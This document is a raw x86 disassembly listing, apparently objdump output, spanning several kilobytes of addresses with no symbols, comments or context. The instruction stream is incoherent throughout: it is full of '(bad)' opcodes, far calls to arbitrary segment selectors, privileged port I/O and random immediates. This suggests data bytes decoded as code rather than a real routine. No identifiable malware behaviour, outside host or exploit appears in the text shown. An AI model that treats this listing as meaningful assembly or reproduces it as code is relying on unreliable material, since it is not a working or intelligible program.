  421ce2:	jmp    0xf198:0x3b4d35d7
  421ce9:	xchg   esi,eax
  421cea:	retf   0xe1e3
  421ced:	cmp    dl,BYTE PTR [eax]
  421cef:	mov    bl,0xfb
  421cf1:	dec    ecx
  421cf2:	nop
  421cf3:	mov    esp,0x84cee52
  421cf8:	jp     0x421d5e
  421cfa:	xor    DWORD PTR [ecx-0x204cc034],0xffffffb1
  421d01:	push   eax
  421d02:	sub    DWORD PTR [ecx-0x37],esp
  421d05:	xchg   DWORD PTR [esp+ebp*8+0x35e81048],ecx
  421d0c:	in     eax,dx
  421d0d:	test   al,0xee
  421d0f:	in     eax,dx
  421d10:	imul   ecx,DWORD PTR [esi+0x45],0x6b12514f
  421d17:	ja     0x421cfa
  421d19:	lods   al,BYTE PTR ds:[esi]
  421d1a:	nop
  421d1b:	mov    dl,0x27
  421d1d:	mov    dl,0xfa
  421d1f:	retf   0x92f4
  421d22:	push   ss
  421d23:	in     al,0x20
  421d25:	jp     0x421d2f
  421d27:	xchg   edx,eax
  421d28:	je     0x421ce8
  421d2a:	mov    dh,0xf6
  421d2c:	popf   
  421d2d:	es int 0xfe
  421d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d31:	imul   ecx,esi,0x7647a8d5
  421d37:	xor    BYTE PTR [eax-0x6b799b50],bl
  421d3d:	test   BYTE PTR [esi],bh
  421d3f:	push   0x2b
  421d41:	mov    dh,0x35
  421d43:	retfw  
  421d45:	clc    
  421d46:	inc    esp
  421d47:	test   DWORD PTR [edi],esi
  421d49:	add    ebx,edi
  421d4b:	dec    esp
  421d4c:	and    DWORD PTR [eax],eax
	...
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	call   0x198:0xd13f6c3a
  421d6d:	add    bl,bh
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [edi],dl
  421d73:	data16 sbb BYTE PTR ss:[eax-0x29],0xfc
  421d79:	mov    bl,0x17
  421d7b:	aam    0xf1
  421d7d:	xchg   ebx,eax
  421d7e:	mov    bh,0xc4
  421d80:	loopne 0x421e00
  421d82:	cmp    DWORD PTR [edx+0x8],edx
  421d85:	ret    0x77e2
  421d88:	mov    edi,0x1202802e
  421d8d:	push   esi
  421d8e:	call   0x67a1:0xce5fedab
  421d95:	mov    dl,0xdf
  421d97:	push   ss
  421d98:	xchg   DWORD PTR [eax+ecx*1-0x9],edx
  421d9c:	or     al,0x49
  421d9e:	pop    ds
  421d9f:	xor    ah,bh
  421da1:	sub    DWORD PTR [ecx+0x42c5a5ff],ebp
  421da7:	loopne 0x421de3
  421da9:	dec    edx
  421daa:	out    0xf9,eax
  421dac:	sub    esp,DWORD PTR [ebp+0x69]
  421daf:	lahf   
  421db0:	mov    edx,0xaff41823
  421db5:	dec    ebp
  421db6:	or     esi,ebx
  421db8:	repnz lea eax,[eax-0x583e46e4]
  421dbf:	cs xchg al,dh
  421dc2:	pop    esp
  421dc3:	shl    bl,cl
  421dc5:	pushf  
  421dc6:	out    0xcf,eax
  421dc8:	mov    ebp,0x8db28448
  421dcd:	adc    BYTE PTR ds:0x4f1c7298,dl
  421dd3:	rcr    DWORD PTR [ecx+0x4d5c50f4],1
  421dd9:	stos   BYTE PTR es:[edi],al
  421dda:	rol    dl,1
  421ddc:	lea    esp,[edi-0x7b]
  421ddf:	add    al,0x7f
  421de1:	pop    esp
  421de2:	shl    BYTE PTR [ecx-0xdf44319],cl
  421de8:	popf   
  421de9:	pop    eax
  421dea:	loopne 0x421e51
  421dec:	xchg   esi,eax
  421ded:	jns    0x421e3c
  421def:	test   BYTE PTR [esi-0x448b2ee6],0xe6
  421df6:	mov    eax,0xe7e78ded
  421dfb:	dec    ebx
  421dfc:	nop
  421dfd:	(bad)  
  421dfe:	retf   
  421dff:	repnz arpl WORD PTR [edx-0x7298a1f1],dx
  421e06:	or     esp,esp
  421e08:	jns    0x421dda
  421e0a:	inc    al
  421e0c:	enter  0xfb83,0x80
  421e10:	sub    DWORD PTR [ecx-0x5e],ebx
  421e13:	(bad)  
  421e15:	fild   WORD PTR [esi]
  421e17:	cld    
  421e18:	sar    BYTE PTR [ebx+ecx*1],1
  421e1b:	jmp    0xf83c89a6
  421e20:	mov    eax,0xb9b07755
  421e25:	repz inc esp
  421e27:	dec    eax
  421e28:	sub    dh,BYTE PTR [ecx+0x2f]
  421e2b:	dec    eax
  421e2c:	and    BYTE PTR [eax+0x3c],bh
  421e2f:	adc    eax,0xe5c4840
  421e34:	aam    0xa4
  421e36:	fldenv [ecx]
  421e38:	sub    bh,al
  421e3a:	jle    0x421e66
  421e3c:	and    BYTE PTR [ebp-0x43409394],al
  421e42:	int3   
  421e43:	repz mov edi,0x7438f66a
  421e49:	sub    eax,0xfd0f5fc2
  421e4e:	add    eax,0x427e14d9
  421e53:	outs   dx,BYTE PTR ds:[esi]
  421e54:	popf   
  421e55:	js     0x421e48
  421e57:	mov    esp,DWORD PTR [ebx-0xd]
  421e5a:	add    DWORD PTR [esi],0x6a956e26
  421e60:	popa   
  421e61:	adc    DWORD PTR [eax],0x2207b87f
  421e67:	lods   eax,DWORD PTR ds:[esi]
  421e68:	fcom   DWORD PTR [edi]
  421e6a:	jnp    0x421e56
  421e6c:	jl     0x421e5d
  421e6e:	mov    edx,DWORD PTR [edx+ebp*2]
  421e71:	sbb    esp,DWORD PTR [eax+0x645756ef]
  421e77:	push   ebp
  421e78:	xchg   edx,eax
  421e79:	and    bl,ch
  421e7b:	mov    edi,0xec85db75
  421e80:	(bad)  
  421e82:	popa   
  421e83:	xchg   edx,eax
  421e84:	xchg   ebp,eax
  421e85:	sbb    al,0xd5
  421e88:	(bad)  
  421e89:	rcl    BYTE PTR [ebx+0x6a],1
  421e8c:	jae    0x421e53
  421e8e:	xchg   esi,eax
  421e8f:	addr16 std 
  421e91:	outs   dx,DWORD PTR ds:[esi]
  421e92:	retf   
  421e93:	inc    ecx
  421e94:	fdiv   DWORD PTR [ebp+0x392ecb9c]
  421e9a:	add    DWORD PTR [eax+0x4],edx
  421e9d:	rcr    BYTE PTR [eax-0x7f],0xc5
  421ea1:	dec    edx
  421ea2:	neg    dl
  421ea4:	ret    
  421ea5:	(bad)  
  421ea6:	addr16 popa 
  421ea8:	xchg   ebp,eax
  421ea9:	inc    ecx
  421eaa:	pop    edx
  421eab:	sub    ebx,DWORD PTR [eax-0x2d]
  421eae:	push   ds
  421eaf:	push   0x4713f1e
  421eb4:	xor    DWORD PTR [edi-0xfbf0199],eax
  421eba:	push   esp
  421ebb:	pop    esi
  421ebc:	call   0xef4:0xde283b01
  421ec3:	mov    ds:0xca8f6c5d,eax
  421ec8:	jbe    0x421e87
  421eca:	jl     0x421f39
  421ecc:	dec    ebp
  421ecd:	scas   al,BYTE PTR es:[edi]
  421ece:	xchg   DWORD PTR [esi-0xd],ecx
  421ed1:	pop    ecx
  421ed2:	inc    ebx
  421ed3:	ficomp WORD PTR [ebx+0x60]
  421ed6:	add    cl,BYTE PTR [edx+eiz*1+0x39]
  421eda:	aaa    
  421edb:	push   es
  421edc:	mov    ecx,0x2848198d
  421ee1:	int3   
  421ee2:	pop    edi
  421ee3:	mov    ch,0x5b
  421ee5:	inc    edx
  421ee6:	es jno 0x421f1d
  421ee9:	gs push ecx
  421eeb:	stc    
  421eec:	pop    ds
  421eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421eee:	in     eax,dx
  421eef:	pop    edx
  421ef0:	js     0x421e8e
  421ef2:	or     eax,0xc55ff095
  421ef7:	xor    eax,0x9121487d
  421efc:	mov    edx,0x7dbdbaea
  421f01:	sbb    BYTE PTR [edi+edx*2+0x32584afb],ch
  421f08:	mov    eax,ds:0x1ca16342
  421f0d:	pop    es
  421f0e:	stos   DWORD PTR es:[edi],eax
  421f0f:	dec    edx
  421f10:	aad    0x7c
  421f12:	lock cwde 
  421f14:	mov    ecx,0xb874d4db
  421f19:	daa    
  421f1a:	nop
  421f1b:	mov    DWORD PTR [edx+0x40156946],edx
  421f21:	sbb    BYTE PTR [eax],ah
  421f23:	bound  ebp,QWORD PTR [esi+0x42]
  421f26:	push   esp
  421f27:	mov    al,ds:0x17240daa
  421f2c:	xor    DWORD PTR [edi+0x2442a998],esi
  421f32:	js     0x421f32
  421f34:	push   esi
  421f35:	xor    BYTE PTR [ebx],cl
  421f37:	adc    ch,BYTE PTR [ebp+0x6272ec86]
  421f3d:	out    0x31,al
  421f3f:	adc    bl,dl
  421f41:	sbb    eax,0xa50393e5
  421f46:	movaps xmm7,xmm6
  421f49:	fild   QWORD PTR [edi-0x772cd0b1]
  421f4f:	xchg   dx,ax
  421f51:	push   ecx
  421f52:	and    esi,esi
  421f54:	pop    esi
  421f55:	inc    ecx
  421f56:	lods   al,BYTE PTR ds:[si]
  421f58:	lahf   
  421f59:	push   ebx
  421f5a:	dec    eax
  421f5b:	xor    DWORD PTR [esi],esi
  421f5d:	aad    0xf4
  421f5f:	je     0x421f74
  421f61:	inc    eax
  421f62:	(bad)  
  421f63:	xor    bl,al
  421f65:	mov    al,0x6e
  421f67:	inc    ebx
  421f68:	pop    ds
  421f69:	adc    dh,BYTE PTR [edi]
  421f6b:	jle    0x421fcc
	...
  421f79:	add    dh,ch
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [ebx],bl
  421f87:	retf   0x14e5
  421f8a:	int3   
  421f8b:	call   0x0:0x1fb0001
  421f92:	aam    0x2c
  421f94:	mov    gs,WORD PTR [ebp+0x514cae07]
  421f9a:	out    0xba,eax
  421f9c:	push   0xe9e3c318
  421fa1:	inc    ebx
  421fa2:	dec    ebx
  421fa3:	fdivr  st,st(5)
  421fa5:	mov    BYTE PTR [edi+0x2250f265],al
  421fab:	push   edx
  421fac:	stc    
  421fad:	repz and BYTE PTR [di-0x4b76],dl
  421fb3:	aad    0x3c
  421fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fb6:	enter  0x90fe,0x9a
  421fba:	mov    cl,0x44
  421fbc:	popf   
  421fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fbe:	add    DWORD PTR [ebp+0x5eb09443],ebp
  421fc4:	es push esi
  421fc6:	addr16 pop ecx
  421fc8:	cmp    al,0x8
  421fca:	inc    ebx
  421fcb:	push   ebx
  421fcc:	xor    BYTE PTR [eax+0x7a5e7b66],al
  421fd2:	fsubr  DWORD PTR [edi]
  421fd4:	lods   al,BYTE PTR ds:[esi]
  421fd5:	sub    DWORD PTR [edi-0x41],esp
  421fd8:	retf   
  421fd9:	fist   WORD PTR [esp+ebp*8+0x61]
  421fdd:	enter  0xf535,0xb8
  421fe1:	jbe    0x42200b
  421fe3:	push   0x3c
  421fe5:	das    
  421fe6:	imul   edx
  421fe8:	rcr    eax,cl
  421fea:	std    
  421feb:	adc    edx,esp
  421fed:	std    
  421fee:	call   0x6803f85d
  421ff3:	cwde   
  421ff4:	fbstp  TBYTE PTR ds:0xe977f84e
  421ffa:	cmp    ebx,DWORD PTR [ebp-0x5f]
  421ffd:	cmp    al,BYTE PTR [ebx+0x31833ad1]
  422003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422004:	cmp    dl,ch
  422006:	jmp    0x96ff4152
  42200b:	int3   
  42200c:	mov    BYTE PTR [eax],0x16
  42200f:	jp     0x421fde
  422011:	aaa    
  422012:	mov    eax,0xee3321ab
  422017:	xchg   ebp,eax
  422018:	add    al,0xd1
  42201a:	mov    ch,0xa6
  42201c:	(bad)  
  42201d:	ins    BYTE PTR es:[edi],dx
  42201e:	pop    edi
  42201f:	jbe    0x42203e
  422021:	push   ecx
  422022:	jo     0x4220a0
  422024:	loopne 0x42205e
  422026:	sti    
  422027:	imul   eax,DWORD PTR [esi+0x1558bb1f],0x825eadf3
  422031:	jne    0x421fc3
  422033:	sub    ebx,esp
  422035:	push   ecx
  422036:	dec    ecx
  422037:	adc    eax,0x3ffaaf4b
  42203c:	xor    al,0x24
  42203e:	in     al,dx
  42203f:	pop    edx
  422040:	pushf  
  422041:	out    0x56,al
  422043:	js     0x421fdb
  422045:	(bad)  
  422046:	xchg   edx,eax
  422047:	je     0x422087
  422049:	adc    al,0xf6
  42204b:	pop    ebp
  42204c:	xor    BYTE PTR [esi],dl
  42204e:	adc    cl,0x80
  422051:	push   0xffffffdf
  422053:	ror    dh,1
  422055:	leave  
  422056:	cmc    
  422057:	shl    BYTE PTR [ebx-0xd],1
  42205a:	sbb    al,0x70
  42205c:	inc    ebx
  42205d:	sub    eax,0xeb4d6563
  422062:	jbe    0x422060
  422064:	and    bl,BYTE PTR [eax]
  422066:	mov    esi,es
  422068:	push   esp
  422069:	jecxz  0x4220d8
  42206b:	test   al,0xf5
  42206d:	std    
  42206e:	std    
  42206f:	and    eax,0xfa410d6e
  422074:	adc    ecx,DWORD PTR [esi+0x1d27983a]
  42207a:	or     DWORD PTR [edi+0xd8db486],esp
  422080:	mov    ecx,0x8e2c4340
  422085:	push   ecx
  422086:	fisubr DWORD PTR [edi-0x3e]
  422089:	push   0xffffff8a
  42208b:	push   eax
  42208c:	aam    0x61
  42208e:	xchg   DWORD PTR [ebx+ebx*2-0x3b],esp
  422092:	stos   BYTE PTR es:[edi],al
  422093:	fiadd  WORD PTR [edi+0x51b614da]
  422099:	dec    ebp
  42209a:	lock loopne 0x42209c
  42209d:	cmp    BYTE PTR ds:0x67d5532f,bl
  4220a3:	dec    esi
  4220a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220a5:	out    0x3d,al
  4220a7:	fnstenv [edi-0x9b49de2]
  4220ad:	jns    0x422062
  4220af:	add    eax,0x881bade7
  4220b4:	cwde   
  4220b5:	inc    esp
  4220b6:	cmp    bl,BYTE PTR [esi+eax*2-0x62]
  4220ba:	inc    ebx
  4220bb:	into   
  4220bc:	or     DWORD PTR [esi+0x4],eax
  4220bf:	sahf   
  4220c0:	std    
  4220c1:	mov    ebp,0x5e026a91
  4220c6:	fsub   QWORD PTR [ebp-0x51]
  4220c9:	loop   0x422121
  4220cb:	ret    0x1798
  4220ce:	adc    eax,0x54a0acd6
  4220d3:	jmp    0x422090
  4220d5:	outs   dx,DWORD PTR ds:[esi]
  4220d6:	hlt    
  4220d7:	jae    0x422102
  4220d9:	icebp  
  4220da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220db:	dec    esi
  4220dc:	xor    ebp,DWORD PTR [ebx+esi*1-0x1f]
  4220e0:	loopne 0x42212a
  4220e2:	leave  
  4220e3:	inc    edi
  4220e4:	pop    ebp
  4220e5:	and    DWORD PTR [edi],0x9bda9857
  4220eb:	sahf   
  4220ec:	jl     0x422117
  4220ee:	in     eax,0x3
  4220f0:	icebp  
  4220f1:	push   ds
  4220f2:	pusha  
  4220f3:	dec    edi
  4220f4:	loop   0x4220a9
  4220f6:	shl    DWORD PTR [eax-0x41],0x27
  4220fa:	dec    edx
  4220fb:	in     al,dx
  4220fc:	retf   
  4220fd:	mov    bl,0xfb
  4220ff:	xor    dl,BYTE PTR [ecx-0x8]
  422102:	mov    ah,0x84
  422104:	in     eax,dx
  422105:	push   cs
  422106:	adc    al,0x99
  422108:	xchg   DWORD PTR [esi+0x2d9cb1ca],esp
  42210e:	mov    eax,esp
  422110:	(bad)  
  422111:	push   es
  422112:	push   edi
  422113:	je     0x4220e8
  422115:	lods   eax,DWORD PTR ds:[esi]
  422116:	push   eax
  422117:	cs rol dh,0x3a
  42211b:	outs   dx,DWORD PTR ds:[esi]
  42211c:	dec    esi
  42211d:	pop    esp
  42211e:	rol    BYTE PTR [esi+0x3c],1
  422121:	or     esi,DWORD PTR [edx]
  422123:	aaa    
  422124:	cmp    DWORD PTR [ecx-0xe],ebx
  422127:	push   es
  422128:	or     DWORD PTR [ebx-0x165eaa],ebp
  42212e:	push   ebx
  42212f:	icebp  
  422130:	xchg   edi,eax
  422131:	add    bh,BYTE PTR [ecx-0x7e]
  422134:	sub    ecx,DWORD PTR [edx-0x58]
  422137:	out    dx,al
  422138:	jmp    DWORD PTR [ebp-0x21c5c1b1]
  42213e:	xor    al,0xd9
  422140:	addr16 push ebx
  422142:	(bad)  
  422143:	or     al,0xbf
  422145:	retf   0x9132
  422148:	ja     0x422176
  42214a:	pop    ss
  42214b:	xchg   DWORD PTR [edi+0x2],edi
  42214e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42214f:	imul   esi,DWORD PTR [eax+0x28c7591f]
  422156:	into   
  422157:	in     eax,dx
  422158:	xchg   edi,eax
  422159:	mov    edx,0x9e2d3898
  42215e:	dec    eax
  42215f:	cdq    
  422160:	pop    edx
  422161:	cmp    eax,DWORD PTR [ecx]
  422163:	xor    BYTE PTR [eax],ch
  422165:	or     bl,BYTE PTR [ebp-0x4b7f23d7]
  42216b:	int3   
  42216c:	dec    ecx
  42216d:	mov    esi,0x93866046
  422172:	daa    
  422173:	push   0xffffff8e
  422175:	clc    
  422176:	cmp    al,0xd0
  422178:	cmp    esp,esi
  42217a:	or     BYTE PTR [esi+0x30978879],ch
  422180:	adc    cl,bh
  422182:	and    al,0x70
  422184:	jp     0x42214e
  422186:	mov    edx,0x6e42af0a
  42218b:	pop    esp
  42218c:	mov    cl,0x0
	...
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0x53],0xc7cda975
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	sti    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [esi-0x629166d1],bl
  4221b7:	adc    dl,BYTE PTR ss:[ebx-0x7e]
  4221bb:	mov    al,0x71
  4221bd:	cwde   
  4221be:	mov    ebx,0xcbc924d3
  4221c3:	add    BYTE PTR [esi-0x72],ch
  4221c6:	mov    DWORD PTR [ebx-0x75],esp
  4221c9:	jle    0x422153
  4221cb:	or     BYTE PTR [edx+edi*8-0xd37ea2b],dh
  4221d2:	neg    dl
  4221d4:	jle    0x42215a
  4221d6:	leave  
  4221d7:	push   esi
  4221d8:	out    dx,eax
  4221d9:	fmul   QWORD PTR [esi-0x35]
  4221dc:	dec    edx
  4221dd:	dec    ecx
  4221de:	ror    bh,0xf8
  4221e1:	jne    0x4221af
  4221e3:	test   DWORD PTR [edx],ebx
  4221e5:	rcl    BYTE PTR [edx-0x5c],cl
  4221e8:	mov    BYTE PTR [ecx],ch
  4221ea:	cwde   
  4221eb:	fnstcw WORD PTR [ecx+edx*4]
  4221ee:	jg     0x42217e
  4221f0:	aas    
  4221f1:	fcomp  QWORD PTR [edx-0x59]
  4221f4:	and    eax,0x2ce4fb59
  4221f9:	inc    ecx
  4221fa:	cmp    BYTE PTR [ebp+0x22e5b237],bl
  422200:	xchg   edx,eax
  422201:	inc    ecx
  422202:	and    al,0xab
  422204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422205:	fs mov ebp,0xbe72de64
  42220b:	fmul   DWORD PTR [eax]
  42220d:	std    
  42220e:	cmp    BYTE PTR [edx],ah
  422210:	jne    0x4221b8
  422212:	mov    ?,WORD PTR ds:0x1b764651
  422218:	jae    0x42221c
  42221a:	fiadd  DWORD PTR [edi+0x21d7c6d2]
  422220:	push   ds
  422221:	ja     0x4221e0
  422223:	lea    ebp,[eax]
  422225:	pop    ebx
  422226:	or     bl,BYTE PTR [edi-0x7065614c]
  42222c:	sub    eax,0xd0a9bc88
  422231:	xchg   ecx,eax
  422232:	arpl   WORD PTR [edx+0x766d35f2],bp
  422238:	ficomp DWORD PTR [esi]
  42223a:	sub    eax,0x55f46380
  42223f:	(bad)  
  422240:	cmp    al,0x48
  422242:	and    DWORD PTR [ebx-0x22],esi
  422245:	inc    ecx
  422246:	rol    edi,cl
  422248:	imul   edx,DWORD PTR [ecx+ebx*1-0x581727c],0x2cbcdb00
  422253:	sbb    cl,BYTE PTR [esi]
  422255:	mov    ds:0xd1bbf253,al
  42225a:	mov    eax,0x650ddd03
  42225f:	sbb    esp,edx
  422261:	or     al,0x38
  422263:	add    eax,0x652396d7
  422268:	(bad)  
  422269:	jae    0x4222dd
  42226b:	fs loope 0x4222e2
  42226e:	xor    edx,DWORD PTR [ebp-0x44]
  422271:	cld    
  422272:	mov    edx,0x15ad31a8
  422277:	mov    ebp,ebx
  422279:	loope  0x4222ab
  42227b:	mov    esi,0xaaf32b8
  422280:	jle    0x4222b2
  422282:	fmul   DWORD PTR [edi-0x2f7eea92]
  422288:	shl    DWORD PTR [edx-0x38],cl
  42228b:	outs   dx,DWORD PTR ds:[esi]
  42228c:	stos   DWORD PTR es:[edi],eax
  42228d:	imul   esp,DWORD PTR [esi+ecx*4+0x5a],0xecb3d496
  422295:	mov    esp,DWORD PTR [edi+eiz*8]
  422298:	mov    ebx,0x7e4f7f4c
  42229d:	and    eax,0x54017817
  4222a2:	(bad)  
  4222a3:	sub    bl,BYTE PTR [edx]
  4222a5:	add    eax,DWORD PTR [esi]
  4222a7:	sub    eax,0x613f0419
  4222ac:	ja     0x422301
  4222ae:	jne    0x422232
  4222b0:	adc    esi,DWORD PTR [eax+0x51]
  4222b3:	add    al,0x1c
  4222b5:	lods   eax,DWORD PTR ds:[esi]
  4222b6:	cld    
  4222b7:	inc    eax
  4222b8:	cmp    ch,BYTE PTR [edx+eiz*1-0x27c6ed6]
  4222bf:	imul   esp,ebp,0x5f83b378
  4222c5:	add    DWORD PTR [esi-0x709c584f],esi
  4222cb:	push   esi
  4222cc:	pop    esi
  4222cd:	sahf   
  4222ce:	mov    ds:0x5026c2d7,al
  4222d3:	xchg   ebp,eax
  4222d4:	pop    es
  4222d5:	lea    ebp,[edi-0x76]
  4222d8:	pop    esi
  4222d9:	pop    eax
  4222da:	mov    esi,0x26704863
  4222df:	sbb    al,0xc6
  4222e1:	xchg   esi,eax
  4222e2:	push   esi
  4222e3:	mov    ecx,0xa758b45a
  4222e8:	push   es
  4222e9:	mov    edx,0x18e629a6
  4222ee:	cmp    DWORD PTR ds:0xfbad5bff,esi
  4222f4:	sbb    ebx,esi
  4222f6:	mov    dl,0xf1
  4222f8:	dec    esp
  4222f9:	jnp    0x4222c6
  4222fb:	mov    BYTE PTR [ebx],0x74
  4222fe:	in     eax,dx
  4222ff:	std    
  422300:	xchg   ecx,eax
  422301:	ins    DWORD PTR es:[edi],dx
  422302:	in     eax,0xec
  422304:	js     0x422364
  422306:	(bad)  
  422307:	cli    
  422308:	xchg   ebp,eax
  422309:	xchg   esi,eax
  42230a:	mov    bl,0xca
  42230c:	clc    
  42230d:	in     eax,dx
  42230e:	loopne 0x4222f0
  422310:	dec    edx
  422311:	shr    BYTE PTR [ecx],1
  422313:	or     eax,0xebc37eed
  422318:	in     al,dx
  422319:	pushf  
  42231a:	retf   0x8e9c
  42231d:	(bad)  
  42231e:	pop    esp
  42231f:	or     eax,0xfea227a7
  422324:	int3   
  422325:	pop    edx
  422326:	dec    eax
  422327:	mov    edi,0xdc82671a
  42232c:	outs   dx,BYTE PTR ds:[esi]
  42232d:	mov    cl,0x54
  42232f:	(bad)  
  422330:	mov    ah,0x76
  422332:	iret   
  422333:	je     0x42232c
  422335:	mov    al,BYTE PTR [edx+0x25]
  422338:	lea    esi,ds:0xda43f323
  42233e:	(bad)  
  42233f:	shl    cl,cl
  422341:	jg     0x4222fb
  422343:	mov    eax,ds:0xdce35f14
  422348:	int    0x24
  42234a:	in     al,dx
  42234b:	je     0x422397
  42234d:	cmp    eax,0x75fb2d93
  422352:	push   edx
  422353:	mov    esi,0xe4c9d86f
  422358:	fwait
  422359:	push   edx
  42235a:	inc    esi
  42235b:	cmc    
  42235c:	add    BYTE PTR cs:[ebp-0x5adbe66],bh
  422363:	enter  0x839f,0x3b
  422367:	mov    ds:0x3d926cc,al
  42236c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42236d:	mov    gs,WORD PTR [esi]
  42236f:	inc    eax
  422370:	stc    
  422371:	mov    al,0x66
  422373:	mov    ebx,0x5d7a0b13
  422378:	lock int3 
  42237a:	adc    al,0x5c
  42237c:	bound  eax,QWORD PTR [ebx+eax*8+0x5c521948]
  422383:	sub    al,0xd1
  422385:	lea    ecx,[ebx]
  422387:	jmp    0x4223c1
  422389:	pop    edx
  42238a:	shl    ebp,cl
  42238c:	test   al,0xdb
  42238e:	sub    DWORD PTR [edi+0x13],ebx
  422391:	pop    edi
  422392:	mov    esi,DWORD PTR [eax]
  422394:	xor    ecx,eax
  422396:	test   DWORD PTR es:[esi],ecx
  422399:	lds    ebx,FWORD PTR [edx]
  42239b:	nop
  42239c:	push   cs
  42239d:	mov    ah,0x89
  42239f:	jle    0x42237a
  4223a1:	sbb    al,0xa4
  4223a3:	(bad)  
  4223a4:	jb     0x4223fe
  4223a6:	or     BYTE PTR [ecx],al
  4223a8:	int3   
  4223a9:	(bad)  
  4223aa:	int    0xc2
  4223ac:	inc    ebx
	...
  4223b9:	add    BYTE PTR [ecx],dl
  4223bb:	push   cs
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	mov    ch,0x29
  4223c8:	add    BYTE PTR [ecx],ch
  4223ca:	ret    0x19e
  4223cd:	add    bl,bh
  4223cf:	add    DWORD PTR [eax],eax
  4223d1:	add    BYTE PTR [ecx+eax*1+0x686d4d7d],bl
  4223d8:	push   ecx
  4223d9:	or     al,0x1
  4223db:	cdq    
  4223dc:	sbb    al,0x23
  4223de:	inc    esp
  4223df:	sub    DWORD PTR [eax+0x1a],ebp
  4223e2:	not    BYTE PTR [edi-0x7e]
  4223e5:	mov    edx,0x24287b7e
  4223ea:	xchg   BYTE PTR [ebp-0x22c7a87f],dl
  4223f0:	mov    dl,0x70
  4223f2:	jno    0x42245b
  4223f4:	push   edi
  4223f5:	mov    dh,0x5c
  4223f7:	repnz add edi,esp
  4223fa:	out    dx,al
  4223fb:	and    eax,ebx
  4223fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223fe:	inc    esp
  4223ff:	push   ds
  422400:	cmp    ecx,DWORD PTR [esi+0x47c8d285]
  422406:	add    al,0xbc
  422408:	pop    ebp
  422409:	(bad)  
  42240a:	mov    esp,0xf377b7af
  42240f:	lea    edx,[edx+0x2f]
  422412:	iret   
  422413:	test   bl,ch
  422415:	or     esi,esi
  422417:	pop    ds
  422418:	fistp  DWORD PTR [ecx-0x4c]
  42241b:	lods   al,BYTE PTR ds:[esi]
  42241c:	push   ecx
  42241d:	pushf  
  42241e:	lock ret 0x8309
  422422:	scas   al,BYTE PTR es:[edi]
  422423:	rcr    DWORD PTR [edx],0x49
  422426:	sub    BYTE PTR [ebp+0x5c13307c],cl
  42242c:	xchg   ecx,eax
  42242d:	cld    
  42242e:	adc    bl,BYTE PTR [edi-0x21]
  422431:	pop    esi
  422432:	mov    dl,0xc6
  422434:	cmp    BYTE PTR [ecx],bh
  422436:	pop    edi
  422437:	push   0x3398c811
  42243c:	push   edi
  42243d:	inc    edi
  42243e:	inc    ebx
  42243f:	inc    ecx
  422440:	pop    ss
  422441:	jg     0x42246e
  422443:	pusha  
  422444:	lods   al,BYTE PTR ds:[esi]
  422445:	sbb    al,0xc7
  422447:	jg     0x42241b
  422449:	call   0x7c9572d0
  42244e:	adc    al,BYTE PTR [edi-0x4ae77137]
  422454:	ja     0x42240e
  422456:	push   ebx
  422457:	mov    dl,0x3e
  422459:	push   ebp
  42245a:	adc    ah,BYTE PTR [edx+0x123cdea4]
  422460:	xchg   ecx,eax
  422461:	int    0x78
  422463:	inc    ebx
  422464:	push   0x7f
  422466:	pusha  
  422467:	xchg   edi,eax
  422468:	or     DWORD PTR ds:0xc417293f,eax
  42246e:	push   ebx
  42246f:	pop    esi
  422470:	out    dx,al
  422471:	daa    
  422472:	jo     0x422426
  422474:	ins    DWORD PTR es:[edi],dx
  422475:	jno    0x4224ab
  422477:	sbb    DWORD PTR [eax+0x67b15f6f],edx
  42247d:	push   edi
  42247e:	sar    BYTE PTR [esi+ecx*2-0x7b],1
  422482:	dec    esi
  422483:	xor    eax,0xeeb73f09
  422488:	adc    edi,DWORD PTR [edi+0x12500991]
  42248e:	bnd je 0x4224bb
  422491:	sbb    al,0xf3
  422493:	or     DWORD PTR [ebp+0x6e9550c4],eax
  422499:	jbe    0x422516
  42249b:	fwait
  42249c:	loopne 0x4224de
  42249e:	add    BYTE PTR [ebp+0x58],dh
  4224a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224a2:	xor    DWORD PTR [eax+edx*1],esp
  4224a5:	mov    ds:0x73ba107e,eax
  4224aa:	icebp  
  4224ab:	jl     0x4224fd
  4224ad:	add    esp,DWORD PTR [ecx-0x1a8b07f0]
  4224b3:	daa    
  4224b4:	or     bl,BYTE PTR [eax+0x6497eb0b]
  4224ba:	sbb    edi,DWORD PTR [edx-0x5f]
  4224bd:	xchg   esp,eax
  4224be:	cmp    DWORD PTR [eax+0x5b74314a],ebp
  4224c4:	(bad)
  4224c8:	lods   al,BYTE PTR ds:[esi]
  4224c9:	jmp    0x720512d4
  4224ce:	ret    
  4224cf:	popf   
  4224d0:	iret   
  4224d1:	int    0x59
  4224d3:	aas    
  4224d4:	scas   al,BYTE PTR es:[edi]
